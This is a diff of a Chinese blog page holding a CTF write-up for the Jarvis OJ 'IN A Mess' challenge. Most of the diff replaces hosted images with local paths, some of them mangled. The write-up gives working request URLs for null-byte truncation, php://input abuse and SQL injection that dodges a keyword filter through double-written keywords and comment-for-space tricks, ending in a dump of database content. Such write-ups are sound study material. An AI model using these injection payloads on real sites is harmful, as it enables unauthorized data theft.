@@ -89,26 +89,12 @@
 <meta property="og:site_name" content="新先生">
 <meta property="og:description" content="查看源码发现index.phps文件，打开开始代码审计">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://i2.tiimg.com/695378/498b59dccf26dc24.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/bcec2baef29ccdf3.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/b9be18bba3b06281.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/25efa9e4f2f5d153.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/333567e6be32b103.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/63d51e46025628c3.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/a1b1994c19e77237.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/ca8c71e724201a62.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/ca8c71e724201a62.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/08d1ed0f89e61017.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/16c649a74025b5d3.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/880af66aa5170d50.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/221f79319b6f1801.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/00c07b94fe17aee1.png">
-<meta property="og:image" content="http://i2.tiimg.com/695378/0f870d9b3054863b.png">
-<meta property="og:updated_time" content="2019-08-03T06:01:56.144Z">
+<meta property="og:image" content="http://yoursite.com/2019/07/27/Jarvis-OJ-IN-A-Mess/images/Image.png">
+<meta property="og:updated_time" content="2019-08-05T00:40:46.148Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jarvis OJ IN A Mess">
 <meta name="twitter:description" content="查看源码发现index.phps文件，打开开始代码审计">
-<meta name="twitter:image" content="http://i2.tiimg.com/695378/498b59dccf26dc24.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/27/Jarvis-OJ-IN-A-Mess/images/Image.png">
 
 
 
@@ -439,19 +425,19 @@
 <p>他的意思就是判断某个字符串中是否有1114，这个某个字符串就是111加上b的第一个字符。这个条件很容易满足，但是问题就在后面，它又要求b的第一个字符不等于四。前后矛盾啊。<strong>在这里我们使用00截断</strong><br><strong>而且变量a的值是一个文件，不是一个字符串。</strong>因此我们就不能将对应的字符串传递给a，使得data为对应的字符串。<strong>在这里我们使用php伪协议。</strong>那么php伪协议到底什么呢？<br>php://input 是个可以访问请求的原始数据的只读流。，我们的变量a必须是一个文件名字，但是我们总不能在部署服务器上搭建一个文件，所以这个协议在这里充当的作用就是一个衔接的作用，我们以post方式传递参数。<br>id的值很显然不能为0，<strong>但是我们可以利用弱等于</strong>。<br>那我们就开始构造payload：<br><strong>长度大于5<br>其中有1114<br>但是第四个不等等于4</strong></p>
 <hr>
 <hr>
-<p><a href="http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114</a><br><img src="http://i2.tiimg.com/695378/498b59dccf26dc24.png" alt><br>竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。<br><img src="http://i2.tiimg.com/695378/bcec2baef29ccdf3.png" alt><br>后面有个id，可能是sql注入？加个单引号’<br><img src="http://i2.tiimg.com/695378/b9be18bba3b06281.png" alt><br>判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。<br><img src="http://i2.tiimg.com/695378/25efa9e4f2f5d153.png" alt="2427505225efa9e4f2f5d1532253879f.png"></p>
+<p><a href="http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114</a><br><img src="images/Image.png" alt><br>竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。<br>![](images/Image [1].png)<br>后面有个id，可能是sql注入？加个单引号’<br>![](images/Image [2].png)<br>判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。<br>![2427505225efa9e4f2f5d1532253879f.png](images/Image [3].png)</p>
 <hr>
 <p><strong>既然这样那么我们就开始苦逼的sql注入之路吧</strong></p>
 <hr>
-<p>一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。<br><code>web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)</code><br><img src="http://i2.tiimg.com/695378/333567e6be32b103.png" alt="100d6805333567e6be32b103a5bd5bf1.png"><br>select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)</code><br><img src="http://i2.tiimg.com/695378/63d51e46025628c3.png" alt="d54c942563d51e46025628c3a643fddd.png"><br>最后我我们得到的结果：<br><strong>被过滤：</strong><br>select<br>from<br><strong>没有被过滤：</strong><br>and<br>where<br>or<br>/<em>2</em>/<br>/#(为了避免笔记对应的操作这里加一个/)<br>information<br>‘<br>order<br>by<br>我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈</p>
+<p>一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。<br><code>web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)</code><br>![images/0d6805333567e6be32bimages/3a5bd5bf1.png](images/Image [4].png)<br>select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)</code><br>![d54c942563d51e46025628c3a643fddd.png](images/Image [5].png)<br>最后我我们得到的结果：<br><strong>被过滤：</strong><br>select<br>from<br><strong>没有被过滤：</strong><br>and<br>where<br>or<br>/<em>2</em>/<br>/#(为了避免笔记对应的操作这里加一个/)<br>information<br>‘<br>order<br>by<br>我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈</p>
 <hr>
 <p>这题很狗啊，双写绕过必须穿插，不能是selectselect.</p>
 <hr>
-<p>真正的注入即将开始<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#</code><br><img src="http://i2.tiimg.com/695378/a1b1994c19e77237.png" alt="8151c3a5a1b1994c19e77237495e1085.png"><br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code><br><img src="http://i2.tiimg.com/695378/ca8c71e724201a62.png" alt="d38c5f6aca8c71e724201a623653a773.png"><br>三个字段。回显正常。4个字段回显不正常</p>
-<p><img src="http://i2.tiimg.com/695378/ca8c71e724201a62.png" alt="990cca5608d1ed0f89e61017043e656c.png"><br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#</code><br><img src="http://i2.tiimg.com/695378/08d1ed0f89e61017.png" alt="9f465f74f8351777fb4f2d409bb92b92.png"><br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content#</code><br><img src="http://i2.tiimg.com/695378/16c649a74025b5d3.png" alt></p>
+<p>真正的注入即将开始<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#</code><br>![8151c3a5a1b1994c19e77237495eimages/85.png](images/Image [6].png)<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code><br>![d38c5f6aca8c71e724201a623653a773.png](images/Image [7].png)<br>三个字段。回显正常。4个字段回显不正常</p>
+<p>![990cca5608d1ed0f89e6images/17043e656c.png](images/Image [8].png)<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#</code><br>![9f465f74f8351777fb4f2d409bb92b92.png](images/Image [9].png)<br><code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content#</code><br>![](images/Image [10].png)</p>
 <hr>
 <hr>
-<p>flag得到了，那么我们现在就来总结一下吧。<br>首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：<br><img src="http://i2.tiimg.com/695378/880af66aa5170d50.png" alt="b3ee544c880af66aa5170d50f4980267.png"><br>可以看到与id=1的时候回显一样。<br>我在不断的错误中发现了三种情况：<br>1.正常回显<br><img src="http://i2.tiimg.com/695378/221f79319b6f1801.png" alt="95308864221f79319b6f18013cab962a.png"><br>2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)<br><img src="http://i2.tiimg.com/695378/00c07b94fe17aee1.png" alt="9748e99700c07b94fe17aee1b5a558a7.png"><br>3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)<br><img src="http://i2.tiimg.com/695378/0f870d9b3054863b.png" alt="d8f336010f870d9b3054863b39a20b9b.png"></p>
+<p>flag得到了，那么我们现在就来总结一下吧。<br>首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：<br>![b3ee544c880af66aa5170d50f4980267.png](images/Image [11].png)<br>可以看到与id=1的时候回显一样。<br>我在不断的错误中发现了三种情况：<br>1.正常回显<br>![95308864221f79319b6f18013cab962a.png](images/Image [12].png)<br>2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)<br>![9748e99700c07b94fe17aee1b5a558a7.png](images/Image [13].png)<br>3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)<br>![d8f3360images/f870d9b3054863b39a20b9b.png](images/Image [14].png)</p>
 
       
     </div>
@@ -569,7 +555,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
